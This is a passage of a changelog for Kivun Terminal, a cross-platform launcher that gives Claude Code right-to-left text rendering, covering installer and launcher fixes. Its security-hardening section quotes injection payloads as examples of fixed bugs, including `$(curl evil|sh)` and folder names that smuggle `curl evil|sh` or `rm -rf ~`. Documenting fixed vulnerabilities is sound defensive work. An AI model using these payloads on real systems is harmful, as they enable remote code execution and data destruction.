- **"Related projects in the RTL-for-AI-tools community" section** linking the three sibling userland fixes shipping today: [Adaptive-RTL-Extension](https://github.com/Lidor-Mashiach/Adaptive-RTL-Extension) by Lidor Mashiach (browser DOM), [rtl-for-vs-code-agents](https://github.com/GuyRonnen/rtl-for-vs-code-agents) by Guy Ronnen (VS Code webview), and this repo (terminal). Three disjoint surfaces, three independent userland fixes — itself a comment on how overdue the upstream BiDi work is.

### Non-goals (HEAVY §8 addition, 2026-04-24)

- **No character substitution.** Direction comes from BiDi markers only; arrows (`→ ← ↑ ↓`), box-drawing chars (`├ └ │ ─ ┌ ┐ ┘ ┤`), and other directionally-asymmetric glyphs pass through unchanged. Lidor Mashiach's browser extension swaps `→`↔`←` in Hebrew paragraphs (correct for DOM), but that would corrupt tree renderers and status indicators in Claude Code TUI output. Enforced by absence (no character-mapping table in `lib/injector.js`) plus a top-of-file comment to catch well-intentioned PRs.

### Changed

- **`payload/config.txt`** gains a `KIVUN_BIDI_WRAPPER` section (default `on`). Existing `config.txt` files from prior installs are preserved on upgrade - those users won't have the key at all, and the launcher treats missing = `off`. To pick up the new default, delete `%LOCALAPPDATA%\Kivun-WSL\config.txt` and rerun the installer.
- **`payload/kivun-launch.sh`** (WSL-side, invoked from `kivun-terminal.bat`) and **`linux/kivun-launch.sh`** (native-Linux launcher): conditional wrapper invocation based on `KIVUN_BIDI_WRAPPER`. Both launchers log the decision (`active` / `off` / `fallback WARNING`) so config drift is visible in `BASH_LAUNCH_LOG.txt` / `launch.log`.
- **Linux launcher** writes `CLAUDE_EXEC` to its `launch-env.sh` via `printf %q`, preserving the #2 security property from the v1.0.6 audit (no command-substitution re-evaluation of values coming from user-editable config).

### Notes

- **Default-on rationale.** Earlier draft had the wrapper opt-in with a v1.2.0 default-flip after a 4-week feedback window. Dropped that: user base is small, the feedback-window signal thin, and "Hebrew just works after install" is the product promise - requiring a config edit to get the fix contradicts that. Rollback path if wrapper breaks in the wild: single-line `KIVUN_BIDI_WRAPPER=off` edit documented in TROUBLESHOOTING; v1.1.1 hotfix flips the shipped default back if root-cause fix isn't ready in 48 hours. See `docs/specs/ROADMAP.md` for details.
- **Bullet-line fix verified empirically.** The `● שלום` first-line LTR bug from v1.0.6 is fixed in v1.1.0. Verification process: `docs/research/paragraph-direction-test.sh` run on a real KivunTerminal-profile Konsole tested 9 Unicode marker placements; only RLM at position 0 flipped the paragraph direction to RTL. RLE/RLI whole-line wraps did NOT flip paragraph direction (they only affect within-run embedding). The wrapper uses a line-start buffering loop to inject RLM at position 0 whenever the line's first strong char is Hebrew.
- **Still pending before tag:** integration gate §1 run on real Konsole, 1-day production canary on the lead dev's real Claude Code usage, `VERSION` bump 1.0.6 → 1.1.0.

## [1.0.6] - 2026-04-19

### Security hardening pass - 2026-04-21

Full independent security review of the mac, linux, and Windows installer surfaces. 19 findings triaged across 3 critical, 7 high, 6 medium, 3 low. 17 fixed, 1 narrowed, 1 partial, 3 deferred (code-signing).

**Critical**

- **Config-driven RCE in Linux launcher (`payload/kivun-launch.sh`).** The tmp launch-script heredoc was unquoted, so `CLAUDE_FLAGS=$(curl evil|sh)` in `config.txt` would embed a literal `$(...)` into the generated script which bash then executed at launch. Fix: heredoc is now `<<'LAUNCHEOF'` (no interpolation), config values are written to a separate `launch-env.sh` via `printf %q` and sourced by the inner script. Live-tested with a malicious payload - the `$(...)` now passes through to claude as 4 literal argv tokens and never executes.
- **macOS Automator Quick Action shell injection (`mac/scripts/postinstall`).** The workflow built a shell command from the right-clicked folder name and passed it to AppleScript `do script`. A folder named `x'; curl evil|sh; #` would execute. Fix: consolidated the 80-line duplicated workflow body down to a 20-line dispatcher that forwards via `printf %q` + AS double-escape to the desktop `.command` shortcut, which has injection-safe arg handling.
- **macOS postinstall sudoers `NOPASSWD:ALL`.** The Homebrew bootstrap temporarily wrote a sudoers file granting the user passwordless sudo for *all* commands for a 30–60s window; if SIGKILL'd or power-cut during that window, the file would persist indefinitely. Narrowed to `NOPASSWD: /usr/bin/true` (enough for Homebrew's `sudo -v` pre-flight, nothing more) + proactive stale-file sweep on every install + `at`-scheduled 15-minute fallback removal. If Homebrew ever needs real sudo it now fails loud instead of silently receiving root.

**High**

- **Default credentials removed from `payload/config.txt`.** Shipped `USERNAME=username` / `PASSWORD=password` defaults were flagged by secret-scanners (gitleaks, truffleHog, GitHub push-protection) and were also a terrible pattern. WSL Ubuntu account is now created interactively on first boot; no credential keys in the file. Matching updates in `docs/SECURITY.txt` and `docs/CREDENTIALS.txt`.
- **`payload/kivun-terminal.bat` - unquoted SET inside FOR body.** `set RESPONSE_LANGUAGE=%%b` let CMD parse the config value - a line `RESPONSE_LANGUAGE=english& calc.exe` would execute `calc.exe` during config load. All 5 keys now use the quoted form `set "K=%%b"`.
- **`payload/kivun-terminal.bat` - folder-name injection in WSL invocation.** `bash -l -c "cd '%WSL_PATH%'..."` interpolated the folder path into single-quotes - a folder named `a';rm -rf ~;'` escaped and executed `rm`. Now passes via environment: `wsl ... env KIVUN_DIR="%WSL_PATH%" bash -c 'cd "$KIVUN_DIR"'`.
- **`payload/kivun.xlaunch` - X11 access control disabled.** `ExtraParams="-ac"` + `DisableAC="True"` let any local process (any Windows user, any LAN peer through the firewall) connect to VcXsrv display `:0` and keylog/screengrab. Fixed: `-ac` removed, `DisableAC="False"`, and the WSL-side launcher now authorizes only the invoking UID via `xhost +si:localuser:$USER` instead of the blanket `xhost +local:`.
- **NSI installer - VcXsrv TEMP-dropper pattern removed.** The installer was doing `curl -o $TEMP\vcxsrv_installer.exe` followed by silent-exec - the exact 4-factor cluster (download-to-temp + silent-install + elevation + unsigned parent) that trips Defender/SmartScreen cloud heuristics. Auto-install is gone entirely; the installer now opens the official VcXsrv page in the user's browser and prompts them to install manually. The VcXsrv section is now optional (`Section /o`) instead of pre-selected.
- **NSI installer - `curl \| bash` for Claude Code replaced with download-then-run.** Mid-download network drop previously left bash parsing a truncated script. Now: `curl -o $T && [ -s "$T" ] && bash "$T"` with `set -o pipefail` so a failed curl can be detected. Same fix applied in the Linux installer.
- **NSI installer - dropped `RequestExecutionLevel admin`.** Installer writes entirely to `$LOCALAPPDATA\Kivun-WSL` (per-user) and `HKCU` - running elevated meant those writes landed in the elevating admin's hive under over-the-shoulder UAC, making the install invisible to the invoking user. Now runs as `user`; the one admin-required step (`wsl --install` when WSL isn't already set up) becomes a documented prerequisite with clear instructions to run `wsl --install` from admin PowerShell first, then re-launch our installer normally.

**Medium**

- **`mac/scripts/postinstall` iTerm2 fallback** had the same folder-name shell-injection pattern as the Automator workflow. Fixed with a POSIX `shell_quote` helper + AppleScript double-escape for the `write text` literal.
- **Language prompt double-wrapping** in the Automator workflow case block - it stored `LANG_PROMPT="--append-system-prompt \"...\""` and then passed it as `claude --append-system-prompt '$LANG_PROMPT'`, producing `--append-system-prompt --append-system-prompt "..."`. Resolved via the consolidation above: the new shared `payload/languages.sh` returns just the phrase, and the `.command` shortcut wraps it in `--append-system-prompt` itself.
- **`payload/configure-statusline.js` path-with-quote injection.** Using `'node "' + path + '"'` would break on a path containing `"` and inject into Claude Code's `settings.json.statusLine.command`. Switched to `'node ' + JSON.stringify(path)` - JSON-safe and shell-safe.
- **Config parsers missing trailing-newline guard.** `while IFS='=' read -r key value; do …; done` dropped the last line if the config file didn't end in `\n`. Added `|| [[ -n "$key" ]]` to both the Linux launcher and the mac `.command` parsers.
- **Launcher tmpfile TOCTOU.** `/tmp/kivun-claude-launch-$UID.sh` was in a world-writable sticky-bit dir; a malicious local user could pre-symlink it to `~/.bashrc` and have `cat >` clobber it. Moved to `${XDG_CACHE_HOME:-$HOME/.cache}/kivun-terminal/claude-launch.sh` (user-owned, 0700).

**Architectural improvements done in the same pass**

- **`payload/languages.sh`** - single source of truth for the 23-language prompt map, sourced by both the Linux launcher and the macOS `.command` shortcut. Replaced ~70 lines of duplicated case statements that had already drifted (different hyphen/underscore conventions; extra undocumented keys in the Automator path). Also removes one vector for the Automator-vs-shortcut drift problem.
- **`mac/uninstall.sh`** (100 lines, new) - removes desktop `.command`, Finder Quick Action, shell-rc `CLAUDE_CODE_STATUSLINE` export, `statusLine` entry from `~/.claude/settings.json` (via Python JSON edit), `/usr/local/share/kivun-terminal/` tree, pkg receipt, and any stale sudoers file. Deployed into the `.pkg` at `/usr/local/share/kivun-terminal/uninstall.sh`; also available standalone in the repo. Matches the Linux uninstaller's scope and UX.
- **Statusline SHA256 integrity check.** Build-time step generates `statusline.mjs.sha256`; both installers verify before `cp`. Mismatch logs an error and skips install rather than shipping a corrupted file silently. Defends against pkg-extraction corruption.
- **kdialog on KDE instead of zenity.** Linux installer detects `$XDG_CURRENT_DESKTOP` and installs `kdialog` on KDE/Plasma (saves ~30 MB of GTK dependencies that get pulled in by zenity, which doesn't matter to anyone outside our target audience - RTL+Konsole users are overwhelmingly KDE). The launcher tries `kdialog` first when `XDG_CURRENT_DESKTOP=KDE`.

**Deferred (require a code-signing certificate purchase, not a code change)**

- Signed Authenticode `Kivun_Terminal_Setup.exe` - Azure Trusted Signing ~$10/mo or a standard Authenticode cert. Once available, `build-windows.yml` needs a `signtool sign` step between build and release-attach.
- Pre-release submission to Microsoft Defender analysis at `https://www.microsoft.com/en-us/wdsi/filesubmission` to shrink the SmartScreen warning window for early downloaders.
- Signed uninstaller (same cert).

These three together close all remaining "unsigned installer" findings; they are all downstream of buying a cert.

### Phase 3 - Linux port - 2026-04-20

New `linux/` directory with a shell-script installer that covers the four major Linux package ecosystems (apt, dnf, pacman, zypper) and integrates with both GNOME Files (Nautilus) and KDE Dolphin.

- **`linux/install.sh`** - detects distro via `/etc/os-release`, picks the right package manager, installs `konsole`, `nodejs`, `git`, `xdotool`, `wmctrl`, and a color-emoji font. Installs Claude Code via `curl https://claude.ai/install.sh | bash` (skipped if `claude` is already on PATH). Runs as the invoking user; sudo is only requested for the package-install step (with a background keep-alive so the user isn't prompted repeatedly during long installs).
- **`linux/kivun-launch.sh`** - simplified launcher (no WSLg / VcXsrv paths): loads `~/.config/kivun-terminal/config.txt`, refreshes the Konsole profile with the current BiDi/color settings, runs `setxkbmap` for Alt+Shift keyboard toggle (X11 only - warns on Wayland), resolves the target folder (CLI arg → zenity/kdialog picker → `$HOME`), builds a tmp inner-script, and `exec`s Konsole with `--profile KivunTerminal --workdir $TARGET -e $TMP`. Passes Claude `--settings ~/.local/share/kivun-terminal/settings.json` so the statusline always finds the Linux-path `node` binary.
- **`linux/uninstall.sh`** - removes the launcher, Konsole profile, desktop entries, Nautilus script, and Dolphin service menu. Keeps system packages and asks before removing the color scheme or `config.txt`.
- **`linux/kivun-terminal.desktop`** - app-menu entry with `@@HOME@@` placeholder substituted at install time. Declares `MimeType=inode/directory` so it's discoverable as an "Open with" handler for folders, plus `Actions=OpenHome;OpenPicker` for jumplist-style right-click menus.
- **`linux/nautilus-script`** - GNOME Files right-click integration. Reads `NAUTILUS_SCRIPT_SELECTED_FILE_PATHS` (primary) and `NAUTILUS_SCRIPT_CURRENT_URI` (fallback for folder-background context); if the user right-clicked a file rather than a folder, drops to its parent dir.
- **`linux/dolphin-servicemenu.desktop`** - KDE Dolphin service menu using `X-KDE-Priority=TopLevel` so "Open with Kivun Terminal" appears directly on the context menu instead of buried under Actions.
- **`.github/workflows/build-linux.yml`** - CI job on `ubuntu-latest`: syntax-checks all scripts with `bash -n`, pre-installs the packages `install.sh` would otherwise fetch, dry-runs the installer end-to-end, verifies the expected artifacts landed under `$HOME/.local/`, then packages `linux/` + `payload/` + `LICENSE` + `VERSION` into `kivun-terminal-linux-<VER>.tar.gz`. Uploads as an Actions artifact + attaches to GitHub Release on tag push.
- **`linux/README.md`** - quickstart, config schema, supported distros table, Wayland keyboard caveat, uninstall instructions.

Design notes:

- **No WSL / VcXsrv code paths** - on Linux we have a real X11 or Wayland session. `kivun-launch.sh` is ~200 lines instead of ~500 on WSL.
- **Config file at `~/.config/kivun-terminal/config.txt`** (XDG-standard) rather than `~/Library/Application Support/…` (macOS) or `%LOCALAPPDATA%\Kivun-WSL\…` (Windows). Schema unchanged: same `RESPONSE_LANGUAGE`, `TEXT_DIRECTION`, `TERMINAL_COLOR`, `FOLDER_PICKER`, `CLAUDE_FLAGS` keys. New Linux-only `KEYBOARD_TOGGLE` (default `true`).
- **Konsole profile + ColorSchemeNoam** copied verbatim from the WSL build - same `BidiEnabled=true, BidiLineLTR=false` pair that gives Hebrew auto-detected right-alignment while English stays left-aligned.
- **Hebrew first-line limitation** - same upstream [#39881](https://github.com/anthropics/claude-code/issues/39881) issue documented in `README.md` with a link to 👍 it. Konsole handles the rest of the reply correctly.

### Phase 2 - macOS port - 2026-04-20

New `mac/` directory with a `pkgbuild`-based `.pkg` installer modeled on the reference project's postinstall (715 lines), rebranded to Kivun Terminal.

- **`mac/scripts/postinstall`** - installs Xcode CLT, Homebrew (with temp-sudoers fix for non-TTY `.pkg` context), Node, Git, Claude Code, statusline, config file, desktop `.command` shortcut with Finder folder picker + Terminal.app color theme, Finder Quick Action Automator workflow.
- **`mac/build.sh`** - local builder. Stages `statusline.mjs` + `configure-statusline.js` next to `postinstall` and runs `pkgbuild --nopayload --scripts mac/scripts`.
- **`.github/workflows/build-mac.yml`** - CI builder on `macos-latest`. Runs on tag push and manual dispatch, attaches the `.pkg` to GitHub Releases.
- **`mac/README.md`** - quickstart + config schema + build instructions.
- **Terminal choice** - new `MAC_TERMINAL=terminal|iterm2|wezterm` config key. Default `terminal`; when set to `iterm2` or `wezterm`, the desktop `.command` shortcut re-spawns into that emulator for better BiDi/RTL rendering.
- **Config schema** unified with the Windows build: same 23-language `RESPONSE_LANGUAGE`, `TERMINAL_COLOR`, `TEXT_DIRECTION`, `FOLDER_PICKER`, `CLAUDE_FLAGS` keys. `USE_VCXSRV` (Windows-only) is commented out and explicitly noted.
- Hyphen naming (e.g. `azeri-south`) aligned with the Windows build. Underscore variants still accepted in the case statement for backward compat with users migrating from the reference.

Phase 2 is build-only for now - the user doesn't have a Mac to smoke-test on, so verification runs via the GitHub Actions `macos-latest` runner. Phase 3 (Linux `install.sh`) is next.

### Post-release patches - 2026-04-20

Second-day patches applied to the 1.0.6 payload (version string still unchanged; rebuilt `Kivun_Terminal_Setup.exe`).

#### Features ported from `kivun-terminal` (the sibling native Windows + macOS project)

- **Statusline** (`payload/statusline.mjs`, `payload/configure-statusline.js`) - 2-line ANSI-coloured status bar shown at the bottom of Claude Code's TUI. Line 1: folder, model (green for Opus, yellow for Sonnet/Haiku), context-usage bar, total tokens, session duration, cwd. Line 2: `Session -- undefined -- | Weekly -- undefined --` placeholders (Claude Code 2.1.71 doesn't expose rate-limit data to statusline stdin; byte-for-byte matching the reference project's output).
- **23-language prompt table** (`payload/kivun-terminal.bat` `:SET_LANG_PROMPT`) - expanded from the old 2-branch (English/Hebrew) to the full 23-language set: english, hebrew, arabic, persian, urdu, kurdish, pashto, sindhi, yiddish, syriac, dhivehi, nko, adlam, mandaic, samaritan, dari, uyghur, balochi, kashmiri, shahmukhi, azeri-south, jawi, turoyo.
- **Folder picker on launch** (`payload/folder-picker.wsf`) - optional via `FOLDER_PICKER=true` in `config.txt`. Native Windows folder-browse dialog pops before Konsole opens. Right-click "Open with Kivun Terminal" context-menu entries bypass it.
- **`fonts-noto-color-emoji`** added to installer step `[4/7]` so emojis (`👋`, `🔧`, `💻`, etc.) render as colour glyphs in Konsole instead of tofu boxes.
- **`VCXSRV X SERVER`** default flipped to `USE_VCXSRV=true` in `config.txt` - VcXsrv is the reliable path for Alt+Shift keyboard switching; launcher still falls back cleanly to WSLg if VcXsrv isn't installed or reachable.
- **Save-defaults on reinstall** - NSIS now wraps the `config.txt` `File` directive in `${IfNot} ${FileExists}` so existing user edits survive reinstall.

#### Statusline & settings plumbing (WSL-specific)

- **Statusline registration** (`payload/kivun-launch.sh`) - idempotent on every launch: copies `statusline.mjs` into `~/.local/share/kivun-terminal/`, fixes line endings, writes a dedicated `~/.local/share/kivun-terminal/settings.json` with just `{statusLine.type, statusLine.command}`, and also updates `~/.claude/settings.json` via `configure-statusline.js`.
- **`--settings` flag** - the tmp Claude-launch script invokes `claude --settings "$KT_SETTINGS" --append-system-prompt "..."`. Necessary because when cwd is under `/mnt/c/Users/<user>/`, Claude walks up the directory tree and picks up `%USERPROFILE%/.claude/settings.json`, which has a Windows-path `statusLine.command` (`node "C:/..."`) that Linux `node` cannot execute - silently breaking the user-home registration. The `--settings` override guarantees the Linux-path statusline wins.
- **Only-install-Node-if-missing** - NSIS step `[5/7]` now runs `command -v node >/dev/null` before `apt-get install nodejs npm`. When Claude's installer script has already placed a non-apt Node (common when Claude Code was installed prior to our installer), apt would otherwise fail with `exit 100 - held broken packages`.
- **`x11-xserver-utils` added to step `[4/7]`** so `xrandr` is available for primary-monitor detection (falls back to Xinerama head-at-0,0 when `xrandr` doesn't expose a `connected primary` tag).

#### Konsole positioning & window management

- **Primary-monitor-only window** (no longer spans both screens on dual-monitor setups). `payload/kivun-terminal.bat` queries Windows via `wmic DESKTOPMONITOR` (PowerShell is blocked by Group Policy on some machines - wmic works where PS doesn't). Passes `X Y W H` as a 7th argument to `kivun-launch.sh`.
- **80% of primary-monitor, centered** - users wanted a windowed-but-roomy default instead of maximized. Computed as `(TARGET_W*80/100, TARGET_H*80/100)`, positioned at the centre of the primary monitor.
- **Shortcut + WSL bash subprocess launch minimized** - `SW_SHOWMINIMIZED` on the desktop/Start Menu shortcut, `start "Kivun Bash" /MIN` on the WSL bash child. No visible CMD windows cluttering the desktop; all output still in `LAUNCH_LOG.txt` / `BASH_LAUNCH_LOG.txt`.
- **No `pause` on success paths** - the bat exits cleanly once Konsole is confirmed running (minimized window would otherwise need user to click it to dismiss).

#### Hebrew RTL - known upstream limitation documented

- **Upstream issue filed & consolidated** - [anthropics/claude-code#39881](https://github.com/anthropics/claude-code/issues/39881) tracks this. Detailed BiDi analysis + Option-A (RLM-prefix) fix proposal posted as a comment: [#39881 (comment)](https://github.com/anthropics/claude-code/issues/39881#issuecomment-4281323284). Full internal analysis kept at `docs/FEATURE_REQUEST_ANTHROPIC.md`; trimmed public version at `docs/FEATURE_REQUEST_ANTHROPIC_ISSUE.md`.
- **Prompt hack reverted** - earlier attempts to instruct Claude via `--append-system-prompt` to start replies with a dash / header / blank line all failed (Claude ignored formatting constraints on roughly half of replies). `RLM_SUFFIX` is now empty; the system prompt is minimal (`"Always respond in <Language>"` only), matching the reference project. Saves tokens and avoids brittle failing instructions.
- **TROUBLESHOOTING.md** - new section "Claude's Hebrew/Arabic response is left-aligned on the first line" explaining the upstream nature of the issue, what does and doesn't work, and a link to #39881 so users can 👍 it.

### Post-release patches - 2026-04-19 (same-day)

Patches applied to the 1.0.6 payload (version string unchanged; rebuilt `Kivun_Terminal_Setup.exe`).

#### Installer (`installer/Kivun_Terminal_Setup.nsi`)

- **WSL2 setup** - explicitly run `wsl --set-default-version 2` and `wsl --update` before installing Ubuntu; if Ubuntu exists on WSL1, convert it silently with `wsl --set-version Ubuntu 2`. Eliminates the `WSL1 is not supported with your current machine configuration` noise at the top of the install log.
- **Konsole install no longer hangs.** Root causes were (1) `sudo apt-get ...` waiting forever for a password with no TTY, and (2) NSIS `nsExec::ExecToLog` deadlocking on high-volume apt output (~300–500 MB of KDE dependencies). Now runs as `wsl -d Ubuntu -u root`, redirects output to `/tmp/kivun-apt.log`, and uses `nsExec::Exec` (no pipe capture). Install split into 6 numbered steps so Cancel is usable between them.
- **Every error path ends in an OK/Cancel MessageBox** - no more Task-Manager-to-kill-installer situations.
- **VcXsrv section default-checked** (`Section "VcXsrv..."` instead of `Section /o ...`) and **auto-skips** when VcXsrv is already installed. Check uses `$PROGRAMFILES64\VcXsrv\vcxsrv.exe` (NSIS is 32-bit, so plain `$PROGRAMFILES` is WOW64-redirected to `Program Files (x86)` - the wrong path) and falls back to `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VcXsrv is X server` in both 32- and 64-bit registry views.
- **Desktop shortcut now actually appears.** Two bugs: (a) `kivun_icon.ico` was referenced by the shortcut but never copied to `$INSTDIR` (added to `File` directives); (b) admin-elevated `$DESKTOP` / `$SMPROGRAMS` pointed at the elevated account's folders, not the invoking user's - added `SetShellVarContext current` in both install and uninstall sections.

#### Windows launcher (`payload/kivun-terminal.bat`)

- **Bat parsing fix.** Added `REM` and a nested `for ... call :STRIP_CR %%V` inside an `if exist config.txt (...)` block broke CMD's nested-parens parser and the script silently exited mid-run (no visible error, no CMD window, `LAUNCH_LOG.txt` just cut off). Reverted the config parser to the original simple form.
- **CR-tolerant language match.** Config lines come in as CRLF, so `%RESPONSE_LANGUAGE%` can end up as `english\r`. Comparison now uses `%RESPONSE_LANGUAGE:~0,6%` - first 6 chars, trailing CR harmless.
- **WSL path conversion for `$INSTDIR`.** `%~dp0` ends with `\`, which `wslpath` interprets as an escape. Now strips the trailing backslash before calling `wslpath -a`, and if that still fails, falls back to manual drive-letter conversion via the new `:WIN_TO_WSL_PATH` subroutine. Without this, the launch command was built with an empty `INST_WSL`, shifting every argument and passing an empty `CLAUDE_PROMPT` to `claude --append-system-prompt`.
- **Run as the WSLg-dir owner.** `wsl -d Ubuntu ...` now detects `stat -c %U /mnt/wslg/runtime-dir` and passes `--user <owner>`. See the TROUBLESHOOTING note on Qt runtime-dir checks for why this matters.
- **CRLF line endings enforced.** `kivun-terminal.bat` must be saved as CRLF. Files round-tripped through WSL/`cp` get LF-only endings, which CMD's parser silently mishandles in nested blocks.

#### WSL launcher (`payload/kivun-launch.sh`)

- **Hebrew RTL alignment.** Changed `BidiLineLTR` from `true` to `false` in the generated Konsole profile when `TEXT_DIR=rtl`. With `BidiLineLTR=true`, BiDi reordered the letters correctly but left the line base direction LTR (Hebrew showed left-aligned); with `false`, Konsole auto-detects line direction and Hebrew lines become RTL/right-aligned while English lines stay LTR.
- **`XDG_RUNTIME_DIR` no longer broken.** Previous logic replaced WSLg's `/mnt/wslg/runtime-dir` with a private `/tmp/runtime-<uid>` whenever `[ ! -O ]` returned true - which breaks Konsole's Wayland/D-Bus socket discovery because sockets live in the WSLg dir. Now tests `-d && -w && -S $WSLG_DIR/wayland-0` and keeps WSLg's dir when usable.
- **Qt permission check.** When we own `/mnt/wslg/runtime-dir` (i.e. we were launched as the right user), `chmod 700` on startup so Qt's `0700 only` check passes - without this, `QStandardPaths: wrong permissions ... 0777 instead of 0700` means no visible Konsole window.
- **Stale konsole cleanup.** `pkill -x -u $UID konsole` before launch - zombie Konsole processes from earlier failed runs were being picked up by `xdotool search --class konsole` as the "found Konsole window," making every retry appear to succeed while the new window never rendered.
- **Per-UID temp script path.** `/tmp/kivun-claude-launch-$(id -u).sh` instead of a fixed path. A stale file owned by a different UID (from an earlier run) would cause `Permission denied` on overwrite and make Konsole launch the old script's contents.
- **Better temp-script diagnostics.** Now prints the `claude` binary location, working dir, and exit code. If `claude` isn't in `PATH`, prints install instructions instead of silently closing.

#### Docs

- TROUBLESHOOTING.md - added sections for Qt runtime-dir checks, installer-appears-frozen, silent-bat-exit, and permission-denied on the temp script.


### Added - first standalone release

Kivun Terminal is carved out of the `chat/` folder in the ClaudeCode Launchpad CLI repo and published as its own product: a WSL2 + Ubuntu + Konsole launcher for Claude Code with real RTL/BiDi rendering that Windows Terminal cannot provide.

- **NSIS installer** (`Kivun_Terminal_Setup.exe`) - single-click installation of WSL2, Ubuntu, Konsole, wmctrl, xdotool, and the Claude Code CLI.
- **Dedicated install directory** `%LOCALAPPDATA%\Kivun-WSL` - separates logs, config, and launchers from Launchpad CLI v2.4.x (`%LOCALAPPDATA%\Kivun`), allowing both products to coexist on the same machine.
- **11 supported RTL languages** via `PRIMARY_LANGUAGE` in `config.txt`: hebrew, arabic, persian, urdu, pashto, kurdish, dari, uyghur, sindhi, azerbaijani (with Hebrew as default).
- **`KivunTerminal` Konsole profile** (renamed from `ClaudeHebrew` - the old name implied Hebrew-only). Deployed automatically on first launch.
- **`ColorSchemeNoam`** color scheme - light blue background (`#C8E6FF`) with dark foreground for readability.
- **VERSION file** drives the product version string in both the NSIS build and the batch launcher (single source of truth).
- **VcXsrv mode** (optional component) - enables real Alt+Shift keyboard layout switching inside Konsole. Falls back to WSLg when VcXsrv isn't available.
- **Right-click folder integration** (optional component) - "Open with Kivun Terminal" entry on Windows Explorer folder context menus.
- **Desktop + Start Menu shortcuts** - quick launch into `%USERPROFILE%`.
- **GitHub Actions release pipeline** (`build-windows.yml`) - tagging `v1.0.6` automatically builds `Kivun_Terminal_Setup.exe` and attaches it to the GitHub Release. RC and beta tags are marked pre-release.
- **Docs** - README, README_INSTALLATION, SECURITY, CREDENTIALS, TROUBLESHOOTING.

### Fixed - issues inherited from `chat/`

- `kivun-terminal.bat` referenced `%~dp0kivun.xlaunch`, which did not exist. `kivun.xlaunch` is now shipped in the payload.
- Launcher previously wrote logs to `%LOCALAPPDATA%\Kivun\` - the same directory Launchpad CLI uses. Changed to `%LOCALAPPDATA%\Kivun-WSL\` to prevent cross-contamination.
- Konsole profile name hardcoded as `ClaudeHebrew` despite 11 supported languages. Renamed to `KivunTerminal`.
- `config.txt` referenced three documentation files (`SECURITY.txt`, `CREDENTIALS.txt`, `README_INSTALLATION.md`) that never existed. All three are now written and shipped.

### Known limitations

- Installer is unsigned - Windows SmartScreen will show a warning on first run. Code signing requires a certificate (~$100/year) and is deferred.
- Konsole statusline (Sonnet/Opus badge, context %, session usage) - present in Launchpad CLI v2.4.x but not yet ported to this WSL variant. Planned for v1.1.
- macOS and native Linux builds are out of scope for v1.0.6. Planned for v1.1 (macOS via `pkgbuild` and GitHub Actions `macos-latest` runner).

[1.1.7]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.7
[1.1.6]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.6
[1.1.5]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.5
[1.1.4]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.4
[1.1.3]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.3
[1.1.2]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.2
[1.1.1]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.1
[1.1.0]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.1.0
[1.0.6]: https://github.com/noambrand/kivun-terminal-wsl/releases/tag/v1.0.6
